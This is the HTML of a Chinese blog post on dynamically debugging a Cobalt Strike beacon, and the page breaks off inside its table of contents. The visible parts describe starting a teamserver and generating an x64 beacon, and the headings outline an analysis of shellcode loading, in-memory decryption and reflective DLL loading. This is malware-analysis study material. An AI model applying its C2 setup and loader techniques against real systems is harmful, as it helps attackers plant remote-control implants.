<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="YCr0w"><meta name="copyright" content="YCr0w"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>CobaltStrike动调 | YCr0w'blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":"要么庸俗，要么孤独","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="CobaltStrike动调Teamserver的配置与Beacon生成Teamserver的配置（使用管理员权限启动） 1.\teamserver.bat 192.168.18.132 password  ···  ​​ ‍ 生成Beacon.启动监听器 ​​ ‍ 生成beacon程序 选择监听器，然后点击attacks，生成X64 beacon ​​ 点击Generate并选择保存位置 ‍ 在">
<meta property="og:type" content="article">
<meta property="og:title" content="CobaltStrike动调">
<meta property="og:url" content="http://example.com/2024/08/07/CobaltStrike%E5%8A%A8%E8%B0%83/index.html">
<meta property="og:site_name" content="YCr0w&#39;blog">
<meta property="og:description" content="CobaltStrike动调Teamserver的配置与Beacon生成Teamserver的配置（使用管理员权限启动） 1.\teamserver.bat 192.168.18.132 password  ···  ​​ ‍ 生成Beacon.启动监听器 ​​ ‍ 生成beacon程序 选择监听器，然后点击attacks，生成X64 beacon ​​ 点击Generate并选择保存位置 ‍ 在">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724140426-dfjuw69.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20141559-20240724142315-snv7d6i.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724151429-y3q2wru.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724155248-lqha2gw.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724170251-ndywrrd.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724165103-sus919p.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724165450-tolxpk8.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724165808-bkg8pj2.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724171148-jji2n9f.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725171330-cy5h4v8.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725171842-h8n6zml.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725172132-srxrytu.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725181908-k94jy3v.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240726120003-5kvhfk5.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240726120043-8xqqu0a.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240726164853-xa8p6lk.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240802164415-vbkq86b.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240802171736-gwc442d.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240802171856-xzeii6y.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805135225-okrqgj3.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805135726-uatq7us.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805135857-dpnz6c0.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805181906-41eeqw7.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808124111-ppmadoq.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808125559-zhgrtsq.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808144752-a5syb6m.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808145321-yto8c8h.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808205728-pqlk76d.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808210039-31cdvyy.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808221834-vwqav5w.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808225600-cam3uhw.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808230735-4ba6bfo.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240809192242-f83bqfa.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810200253-thzdm8i.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810201107-mryu0ps.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810201336-bijlsrc.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810202603-r1im9gx.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810203336-pzj6o0k.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810211435-j7uhckr.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810221342-lcva82k.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810221408-phcs4j7.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810232814-644y6wq.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810233459-ego19c5.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810234521-qvv8emo.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810235117-w88vhy9.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811000001-lq218fu.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811001509-iw20xtk.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811114028-0ok8xm5.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811114220-9ra8mjc.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811114940-00c4p4p.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811132652-7v26ils.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811135522-pilv2lw.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811142601-fon62su.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811160409-6vrbu0k.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811160616-wrw5r0r.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811161153-sqr3dnb.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811161626-lma7hrj.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811215852-7ur6ibi.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811224631-3hn7w0u.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811224956-hecd2sc.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811225017-n8wx88l.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811233902-dzkfxhb.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812175912-m1qlxkv.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812180429-0716hle.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812210111-ewc5ixy.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812210241-zque1io.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813122910-lxosu1a.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813133026-z4e0gmx.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813142358-ccr1zhg.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813143715-qln8ecu.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813145110-48hgzog.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813150306-zqui8kb.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813150632-49r5evy.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813152827-c4xyoin.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813153544-juiff0s.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813160659-kw34mdc.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813161340-k3o72hu.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813162101-0un2sd2.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813162836-m988wco.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813163039-ftirtif.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813164956-yb265iu.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813165844-8w0pqfv.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813170033-dymfwif.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812215212-5lmtmjb.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812221244-xpfokyc.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812221954-5b8uymb.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812223747-vsemf3z.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240903212309-s4dxvqc.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240903213113-xs9o1ze.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240903213152-5rcre8b.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240904105142-4q8a8p1.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905172853-hwup8ds.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905181025-embj791.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905181607-2zq54zq.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905182037-w7ec6m0.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905185355-1yymp1u.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905185406-wdxklf1.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905190008-o851ffa.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905190145-0qc46p9.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240906215025-64nj7kk.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240906215541-6f46p8t.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240906215719-ijp5cer.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907135717-za7hke9.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907214931-mgre23h.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907153357-pmx5jf1.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907223853-zjr1vaq.png">
<meta property="og:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905214612-4hewr4y.png">
<meta property="article:published_time" content="2024-08-07T04:40:41.000Z">
<meta property="article:modified_time" content="2024-09-26T13:23:50.398Z">
<meta property="article:author" content="YCr0w">
<meta property="article:tag" content="学习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724140426-dfjuw69.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="YCr0w"><img width="96" loading="lazy" src="/yun.png" alt="YCr0w"><span class="site-author-status">^_^</span></a><div class="site-author-name"><a href="/about/">YCr0w</a></div><a class="site-name" href="/about/site.html">YCr0w'blog</a><sub class="site-subtitle">逆风而行</sub><div class="site-description">找到美的真正所在：不断前行，不要舍弃梦想。</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" href="/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:quill-pen-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/YCr0w" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:3083981460@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CobaltStrike%E5%8A%A8%E8%B0%83"><span class="toc-number">1.</span> <span class="toc-text">CobaltStrike动调</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Teamserver%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8EBeacon%E7%94%9F%E6%88%90"><span class="toc-number">2.</span> <span class="toc-text">Teamserver的配置与Beacon生成</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Teamserver%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.</span> <span class="toc-text">Teamserver的配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90Beacon"><span class="toc-number">2.1.1.</span> <span class="toc-text">生成Beacon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">在目标上线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%8A%9F%E8%83%BD"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">测试功能</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Beacon%E8%B0%83%E8%AF%95%E5%A4%96%E5%A3%B3%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">Beacon调试外壳分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text">main​函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-402A60%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">sub_402A60​函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-401795%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.</span> <span class="toc-text">sub_401795​函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-401685%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">sub_401685​函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-4015D0%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.1.1.</span> <span class="toc-text">sub_4015D0​函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-401742%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">sub_401742​函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-4016A2%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.2.1.</span> <span class="toc-text">sub_4016A2​函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-40152E%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.3.</span> <span class="toc-text">sub_40152E​函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-4014F3%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.3.1.</span> <span class="toc-text">sub_4014F3​函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#StartAddress%E2%80%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.2.3.2.</span> <span class="toc-text">StartAddress​函数</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">shellcode分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%AB%AFshellcode%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.1.</span> <span class="toc-text">远端shellcode加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%9F%BA%E5%9D%80"><span class="toc-number">4.1.1.</span> <span class="toc-text">获取模块基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%8A%9F%E8%83%BD%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.2.</span> <span class="toc-text">加载功能函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.1.3.</span> <span class="toc-text">远程文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8A%A8%E6%80%81%E8%A7%A3%E5%AF%86"><span class="toc-number">4.1.4.</span> <span class="toc-text">内存动态解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%AB%AF%E6%96%87%E4%BB%B6%E8%A3%85%E8%BD%BD"><span class="toc-number">4.2.</span> <span class="toc-text">远端文件装载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%9F%BA%E5%9D%80%E7%9A%84%E5%AE%9A%E4%BD%8D"><span class="toc-number">4.2.1.</span> <span class="toc-text">内存文件基址的定位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%9F%BA%E5%9D%80-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">获取模块基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%8A%9F%E8%83%BD%E5%87%BD%E6%95%B0-1"><span class="toc-number">4.2.3.</span> <span class="toc-text">加载功能函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL%E6%96%87%E4%BB%B6%E9%87%8D%E8%A3%85%E8%BD%BD"><span class="toc-number">4.3.</span> <span class="toc-text">DLL文件重装载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E8%BE%9F%E7%94%A8%E4%BA%8E%E9%87%8D%E8%A3%85%E8%BD%BD%E7%9A%84%E7%A9%BA%E9%97%B4"><span class="toc-number">4.3.1.</span> <span class="toc-text">开辟用于重装载的空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E6%96%87%E4%BB%B6%E5%A4%B4%E5%A4%8D%E5%88%B6"><span class="toc-number">4.3.2.</span> <span class="toc-text">PE文件头复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E5%8C%BA%E6%AE%B5%E5%A4%8D%E5%88%B6"><span class="toc-number">4.3.3.</span> <span class="toc-text">各区段复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E8%A1%A8%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.3.4.</span> <span class="toc-text">导入表修复</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.3.4.0.1.</span> <span class="toc-text">修复准备工作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%90%8D%E7%A7%B0"><span class="toc-number">4.3.4.0.2.</span> <span class="toc-text">获取模块名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E6%8C%89%E5%90%8D%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.4.0.3.</span> <span class="toc-text">模块按名加载</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8A%9F%E8%83%BD%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0"><span class="toc-number">4.3.4.0.4.</span> <span class="toc-text">获取功能函数名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%E6%8C%89%E5%90%8D%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.4.0.5.</span> <span class="toc-text">功能模块按名加载</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.3.5.</span> <span 